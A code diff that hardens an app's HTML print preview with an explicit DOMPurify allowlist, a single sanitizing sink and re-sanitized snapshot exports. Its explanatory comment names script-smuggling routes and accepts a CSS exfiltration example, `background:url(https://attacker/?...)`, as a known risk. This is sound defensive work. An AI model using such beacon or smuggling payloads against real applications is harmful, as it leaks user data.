@@ -3,6 +3,7 @@ import { createSignal, onMount } from '@bundled/solid-js';
 import html from '@bundled/solid-js/html';
 import { render } from '@bundled/solid-js/web';
 import { invoke, list, errMsg, appStorage } from '@bundled/yaar';
+import DOMPurify from '@bundled/dompurify';
 import './styles.css';
 
 // Light-themed app: use the shipped .y-light token overrides (injected by the
@@ -191,6 +192,103 @@ async function handleStorageSelection() {
   await openFromStorage(path);
 }
 
+/**
+ * Document-preview sanitization policy.
+ *
+ * This app is not a prose renderer — the preview element IS the print artifact
+ * (`window.print()` prints `#print-area`, and `saveHtmlSnapshot` persists its
+ * innerHTML). So the policy is deliberately wider than the frontend's default
+ * prose policy in exactly one dimension — presentation — and narrower in every
+ * dimension that carries behavior.
+ *
+ * WHAT A PRINTABLE DOCUMENT NEEDS
+ *   - Full heading/block structure, lists, blockquotes, preformatted code.
+ *   - Real table markup incl. thead/tfoot/caption/colgroup and colspan/rowspan;
+ *     tables are how documents lay out tabular data on paper.
+ *   - Images and figures, with width/height so page layout is stable.
+ *   - Inline `style` and `class`. This is the load-bearing exception: print
+ *     layout (page-break-inside, margins, column widths, colors) is expressed
+ *     as inline style, the existing preview already relies on it, and there is
+ *     no stylesheet the author can otherwise reach.
+ *
+ * WHAT IT MUST NEVER HAVE
+ *   - Script execution in any form: <script>, SVG/MathML wrappers that can
+ *     smuggle it, and every `on*` handler attribute. Handled structurally: an
+ *     explicit ALLOWED_TAGS/ALLOWED_ATTR allowlist drops anything unlisted, so
+ *     no on* attribute can survive and no FORBID_* blocklist has to be kept in
+ *     sync with new HTML features.
+ *   - Navigation/embedding: <iframe>, <object>, <embed>, <base>, <link>,
+ *     <meta>. A document that is about to be printed has nothing to embed, and
+ *     these are the classic sandbox-escape and content-injection surfaces.
+ *   - Interactivity: <form>, <input>, <button>, <select>, <textarea>. Paper has
+ *     no submit button; allowing forms only creates a credential-phishing and
+ *     exfiltration surface inside a trusted-looking app window.
+ *   - <style> blocks (as opposed to the `style` attribute). A stylesheet is not
+ *     scoped to #print-area and could restyle or overlay the surrounding app
+ *     chrome; inline style gives authors the layout control they need without
+ *     that reach.
+ *
+ * KNOWN, ACCEPTED TRADEOFF
+ *   Allowing `style` permits CSS-based exfiltration/beaconing — most obviously
+ *   `background:url(https://attacker/?...)`, plus font/image loads that leak a
+ *   page-open signal. That is a real residual risk, consciously accepted here:
+ *   this is a local, user-initiated print preview of content the user pasted or
+ *   previously exported, the leak channel carries no secret the loader does not
+ *   already have, and removing inline style would break the app's core job.
+ *   ALLOWED_URI_REGEXP still constrains href/src to http(s)/mailto/tel/data
+ *   images, so `javascript:` and other exotic schemes are gone regardless.
+ */
+const PRINT_DOC_OPTIONS = {
+  ALLOWED_TAGS: [
+    // Structure
+    'div', 'span', 'p', 'br', 'hr', 'section', 'article', 'header', 'footer',
+    'main', 'aside', 'nav',
+    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+    'blockquote', 'pre', 'code', 'kbd', 'samp', 'var',
+    // Inline text semantics
+    'a', 'strong', 'b', 'em', 'i', 'u', 's', 'small', 'mark', 'abbr', 'cite',
+    'q', 'time', 'sub', 'sup', 'del', 'ins', 'wbr',
+    // Lists
+    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
+    // Tables
+    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption',
+    'colgroup', 'col',
+    // Media
+    'img', 'figure', 'figcaption',
+  ],
+  ALLOWED_ATTR: [
+    // Presentation (see tradeoff note above)
+    'style', 'class', 'id',
+    // Links & media
+    'href', 'src', 'alt', 'title', 'target', 'rel', 'width', 'height', 'loading',
+    // Tables
+    'colspan', 'rowspan', 'headers', 'scope', 'span', 'align', 'valign',
+    // Lists & misc document metadata
+    'start', 'reversed', 'value', 'type', 'datetime', 'cite', 'dir', 'lang',
+  ],
+  // No data-* / aria-* hooks: nothing in a print artifact consumes them, and
+  // they are a convenient place to park payloads for a later sink.
+  ALLOW_DATA_ATTR: false,
+  ALLOW_ARIA_ATTR: false,
+  // NOTE: deliberately NOT using USE_PROFILES. USE_PROFILES *overrides* the
+  // allowlist with DOMPurify's own profile set, which re-admits <form>/<input>;
+  // verified by fixture. The explicit ALLOWED_TAGS above already confines the
+  // output to HTML — SVG/MathML tags are simply absent from it, so
+  // <svg><script>...</script></svg> is stripped wholesale.
+  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|data:image\/(?:png|jpeg|gif|webp);base64,|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
+};
+
+function sanitizeForPrint(dirty: string): string {
+  return DOMPurify.sanitize(dirty, PRINT_DOC_OPTIONS);
+}
+
+/** Escape via the DOM rather than a hand-rolled replaceAll chain. */
+function escapeText(text: string): string {
+  const holder = document.createElement('div');
+  holder.textContent = text;
+  return holder.innerHTML.replaceAll('\n', '<br>');
+}
+
 function renderPreview() {
   if (!contentInputEl || !printAreaEl) return;
   const raw = contentInputEl.value.trim();
@@ -199,24 +297,21 @@ function renderPreview() {
     return;
   }
   const looksLikeHtml = /<\/?[a-z][\s\S]*>/i.test(raw);
-  if (looksLikeHtml) {
-    printAreaEl.innerHTML = raw;
-  } else {
-    const escaped = raw
-      .replaceAll('&', '&amp;')
-      .replaceAll('<', '&lt;')
-      .replaceAll('>', '&gt;')
-      .replaceAll('"', '&quot;')
-      .replaceAll("'", '&#39;')
-      .replaceAll('\n', '<br>');
-    printAreaEl.innerHTML = `<div>${escaped}</div>`;
-  }
+  // Both branches converge on ONE sanitizing sink. Plain text is escaped
+  // through the DOM (textContent -> innerHTML) instead of a manual replace
+  // chain, then passed through the same policy, so there is a single place
+  // where markup can reach the print area.
+  const prepared = looksLikeHtml ? raw : `<div>${escapeText(raw)}</div>`;
+  printAreaEl.innerHTML = sanitizeForPrint(prepared);
 }
 
 async function saveHtmlSnapshot() {
   const ts = new Date().toISOString().replace(/[:.]/g, '-');
   const path = `pdf-viewer/exports/export-${ts}.html`;
-  await storageSave(path, printAreaEl.innerHTML || '<p></p>');
+  // The preview DOM is already post-sanitize, but re-run the policy on the way
+  // out so the persisted artifact is clean regardless of call ordering — this
+  // file is what a future read path (or another app) would load back.
+  await storageSave(path, sanitizeForPrint(printAreaEl.innerHTML) || '<p></p>');
   setGlobalStatus(`Saved HTML: ${path}`);
 }
 
